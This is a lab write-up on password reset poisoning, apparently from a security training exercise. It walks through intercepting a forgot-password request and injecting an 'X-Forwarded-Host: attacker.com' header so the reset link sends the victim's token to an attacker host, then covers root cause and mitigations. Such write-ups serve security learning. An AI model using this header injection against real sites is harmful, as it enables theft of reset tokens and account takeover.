# Lab12 - Password Reset Poisoning via Middleware

## Objective

Gain access to the victim account by exploiting password reset poisoning through header manipulation.

---

## Lab Difficulty

```text
Practitioner
```

---

## Vulnerability Overview

This lab is vulnerable to:

```text
Password Reset Poisoning
```

The application improperly trusted user-controlled headers while generating password reset URLs.

Attackers could manipulate these headers to create malicious password reset links pointing to attacker-controlled infrastructure.

---

## Understanding Password Reset Poisoning

Applications commonly generate reset links dynamically.

Example:

```text
https://example.com/reset?token=abc123
```

If applications trust unvalidated request headers such as:

```http
Host
X-Forwarded-Host
```

attackers may poison generated reset URLs.

---

## Attack Scenario

### Intended Reset Link

```text
https://victim-website.com/reset?token=abc123
```

### Poisoned Reset Link

```text
https://attacker.com/reset?token=abc123
```

If victims click the malicious link, the reset token may be leaked to the attacker.

---

# Reconnaissance

The password reset functionality was analyzed using Burp Suite Proxy.

---

## Initial Observations

The application dynamically generated password reset URLs based on incoming request headers.

This indicated possible header trust vulnerabilities.

---

# Attack Methodology

The attack focused on manipulating HTTP headers during the password reset workflow.

---

# Step 1 - Access Password Reset Functionality

The forgot-password functionality was accessed.

Example endpoint:

```text
/forgot-password
```

---

## Step 2 - Intercept Reset Request

The password reset request was intercepted using Burp Suite Proxy.

Example:

```http
POST /forgot-password HTTP/1.1

username=carlos
```

---

## Step 3 - Inject Malicious Header

A malicious header was inserted into the request.

Example:

```http
X-Forwarded-Host: attacker.com
```

---

## Step 4 - Forward Request

The modified request was forwarded to the server.

---

## Step 5 - Analyze Generated Reset Link

The application generated a password reset URL using the attacker-controlled domain.

Example:

```text
https://attacker.com/reset?token=abc123
```

---

## Step 6 - Victim Receives Malicious Reset Link

The victim received the poisoned password reset email.

When the victim clicked the link:

- the reset token was sent to the attacker-controlled server
- the attacker captured the token

---

## Step 7 - Use Captured Token

The attacker used the stolen reset token to reset the victim’s password.

---

# Result

The victim account password was reset successfully.

Authenticated access was obtained.

---

# Root Cause

The application trusted user-controlled headers while generating password reset URLs.

This allowed attackers to manipulate reset link destinations.

---

# Why This Is Dangerous

Password reset tokens effectively function as authentication credentials.

If attackers steal reset tokens, they may completely compromise accounts.

---

# Common Vulnerable Headers

| Header | Risk |
|---|---|
| Host | URL manipulation |
| X-Forwarded-Host | Reset poisoning |
| X-Host | Header injection |
| Forwarded | Proxy abuse |

---

# Common Testing Methodology

During testing, attackers commonly:

1. Intercept reset requests
2. Inject malicious headers
3. Analyze generated URLs
4. Capture reset tokens
5. Reset victim passwords

---

# Real-World Risks

Password reset poisoning may allow attackers to:

- steal reset tokens
- compromise accounts
- bypass authentication
- escalate privileges

---

# Mitigation

Applications should:

- avoid trusting user-controlled headers
- hardcode trusted domains
- validate forwarded headers strictly
- use secure reset workflows
- monitor suspicious reset activity

---

# Secure Design Principles

Applications should:

- generate reset URLs server-side
- use trusted configuration values
- ignore untrusted forwarding headers
- validate reverse proxy behavior carefully

---

# Tools Used

| Tool | Purpose |
|---|---|
| Burp Suite Proxy | Intercept requests |
| Burp Repeater | Modify headers |
| Collaborator/Attacker Server | Capture reset tokens |

---

# Key Learnings

- Learned how password reset poisoning works.
- Practiced HTTP header manipulation.
- Improved understanding of trust boundaries.
- Understood why reset token security is critical.

---

# Attack Flow Summary

```text
Intercept Reset Request
        ↓
Inject Malicious Header
        ↓
Poison Reset URL
        ↓
Victim Clicks Reset Link
        ↓
Capture Reset Token
        ↓
Reset Victim Password
        ↓
Gain Account Access
```

---

> [!IMPORTANT]
> Password reset tokens should be treated as highly sensitive authentication credentials.

> [!TIP]
> During testing, always analyze whether applications trust forwarding headers.

> [!WARNING]
> Trusting user-controlled headers may completely compromise password reset security.